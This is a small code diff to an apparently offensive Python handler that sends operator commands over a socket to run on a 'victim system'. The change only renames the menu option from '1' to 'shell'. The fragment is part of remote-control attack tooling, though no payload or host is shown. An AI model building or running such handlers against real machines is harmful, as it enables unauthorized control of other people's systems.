@@ -1,5 +1,5 @@
 def options():
-    print("[+] Enter '1' to Execute command on victim system")
+    print("[+] Enter 'shell' to Execute command on victim system")
     print("[+] Enter 'exit' to exit the handler and close the connection")
 
 def send_command(sock):
@@ -20,7 +20,7 @@ def handler(sock):
 
     while True:
         User_input=input("What do you want to do: ")
-        if User_input=="1":
+        if User_input=="shell":
             # User_input=input("Enter command: ")
             sock.send_data(User_input)
             send_command(sock)
